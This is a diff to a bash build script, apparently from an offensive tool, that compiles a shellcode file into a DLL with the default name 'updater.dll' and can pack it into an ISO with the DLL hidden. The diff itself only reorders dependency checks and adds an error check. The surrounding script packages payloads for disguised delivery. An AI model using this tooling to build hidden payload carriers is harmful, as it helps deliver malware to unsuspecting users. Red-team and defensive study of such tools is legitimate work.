@@ -2,21 +2,21 @@
 rm payloads/*.*
 command -v go > /dev/null || { \
     echo "[!] Go is required, please install it"; exit 1; }
-
-command -v mkisofs > /dev/null || { \
+command -v goversioninfo > /dev/null || { \
+    echo "[-] goversioninfo needs to be installed, installing now"; \
+    go install \
+    github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest; \
+}
+if [[ $# -eq 3 ]]; then
+    command -v mkisofs > /dev/null || { \
     echo "[!] mkisofs is required, it's part of cdrtools, please install it"; exit 1; }
-
+fi
 if [[ $# -lt 1 ]]; then
     echo "[!] Invalid number or arguments."
     echo "Usage:"
     echo "$0 /path/to/payload.bin"
     exit 1
 fi
-command -v goversioninfo > /dev/null || { \
-    echo "[-] goversioninfo needs to be installed, installing now"; \
-    go install \
-    github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest; \
-}
 isofilename=${3:-awesome.iso}
 output_dll=${2:-updater.dll}
 sc_fullpath=$(readlink -f "$1")
@@ -43,6 +43,10 @@ if [[ $# -eq 3 ]]; then
     cd ../payloads
     mkisofs -o $isofilename  -V "You've Been GOadered" -hidden "$output_dll" \
         -quiet -allow-lowercase -l * 2>/dev/null
+    if [[ $? -ne 0 ]]; then
+        echo "mkisofs has failed, unhide error and try again"
+        exit 1
+    fi
     echo "[+] ISO file created with filename $isofilename in payloads"
 fi
 echo "[+] WOOOOO, have a nice day!"
